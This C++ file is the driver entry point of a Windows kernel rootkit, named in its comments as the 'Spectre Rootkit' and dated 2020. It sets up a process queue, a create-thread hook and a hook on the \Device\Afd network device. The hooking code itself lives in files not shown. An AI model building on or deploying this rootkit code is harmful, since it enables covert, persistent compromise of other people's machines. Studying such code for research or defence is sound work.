/*
 * This file is subject to the terms and conditions defined in
 * file 'LICENSE', which is part of this source code package.
 *
 * COPYRIGHT Bill Demirkapi 2020
 */
#include "common.h"	
#include "AfdHook.h"

#include "NtFunctionResolver.h"
#include "CreateThreadHook.h"
#include "ProcessQueue.h"

EXTERN_C_START

DRIVER_INITIALIZE DriverEntry;
NTSTATUS
DriverEntry (
    _In_ PDRIVER_OBJECT DriverObject,
    _In_ PUNICODE_STRING RegistryPath
    );

//DRIVER_UNLOAD DriverUnload;
//VOID
//DriverUnload (
//	_In_ PDRIVER_OBJECT DriverObject
//	);
EXTERN_C_END


//
// Manages the hook on \Device\Afd.
//
PAFD_HOOK AfdDeviceHook;
PPROCESS_QUEUE ProcessDispatchQueue;
PCREATE_THREAD_HOOK ThreadHook;

/**
	Initialize the Spectre Rootkit.
	@param DriverObject - The object associated with the driver.
	@param RegistryPath - The registry path of the driver.
	@return Status of driver initialization.
*/
NTSTATUS
DriverEntry (
	_In_ PDRIVER_OBJECT DriverObject,
	_In_ PUNICODE_STRING RegistryPath
	)
{
	NTSTATUS status;

	UNREFERENCED_PARAMETER(DriverObject);
	UNREFERENCED_PARAMETER(RegistryPath);

	status = STATUS_SUCCESS;
	
	ProcessDispatchQueue = new (NonPagedPool, PROCESS_QUEUE_TAG) ProcessQueue();
	ThreadHook = new (NonPagedPool, CREATE_THREAD_HOOK_TAG) CreateThreadHook(ProcessDispatchQueue, &status);
	AfdDeviceHook = new (NonPagedPool, AFD_HOOK_TAG) AfdHook(&status);

//Exit:
	DBGPRINT("INITIALIZED WITH STATUS 0x%X.", status);
	return status;
}